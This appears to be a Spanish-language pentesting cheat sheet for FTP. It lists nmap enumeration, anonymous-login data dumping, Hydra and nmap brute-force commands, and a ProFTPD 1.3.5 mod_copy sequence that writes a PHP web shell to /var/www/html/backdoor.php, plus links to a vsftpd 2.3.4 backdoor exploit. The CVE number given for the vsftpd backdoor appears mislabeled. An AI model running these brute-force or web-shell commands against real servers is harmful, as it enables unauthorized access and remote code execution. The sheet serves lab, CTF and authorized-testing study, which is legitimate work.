# FTP
Protocolo de transferencia de archivos , usualmente en el puerto 21

## Enumeración
### Checkear la existencia de login anonymous mediante NMAP
```
nmap IP --script ftp-anon
```
## Interación con el servicio
### Obtener sesion cuando el login anonymous esta habilitado
```
ftp IP
> username Anonymous
> password Dummy
```
### Obtener la ruta del directorio actual
```
>PWD
```
### Checkear si hay permisión de subir archivos / subir archivos
```
>PUT file.ext
```
### Obtener archivos desde el cliente
```
get file.ext
```
### Volcar los dato del FTP si login anonymous esta activo
```bash
wget ftp://IP/* -r
```
## Ataque por fuerza bruta
### Usando Hydra
```
hydra -L UserList -P PassList ftp://IP 
```
### Usando Nmap
```
nmap --script ftp-brute --script-args userdb=UserList -p Puerto IP
```
## Vulnerabilidades comunes sin metasploit
### ProFTPD 1.3.5 File Copy ( CVE 2015-3306 )
```
https://www.exploit-db.com/exploits/36742
```
#### Convertir la anterior vuln en un RCE
```
site cpfr /proc/self/cmdline
site cpto /tmp/.<?php passthru($_GET['cmd']);?>
site cpfr /tmp/.<?php passthru($_GET['cmd']);?>
site cpto /var/www/html/backdoor.php
```
### vsftpd 2.3.4 Backdoor ( CVE 2011-0762 ) 
```
https://github.com/ahervias77/vsftpd-2.3.4-exploit
```
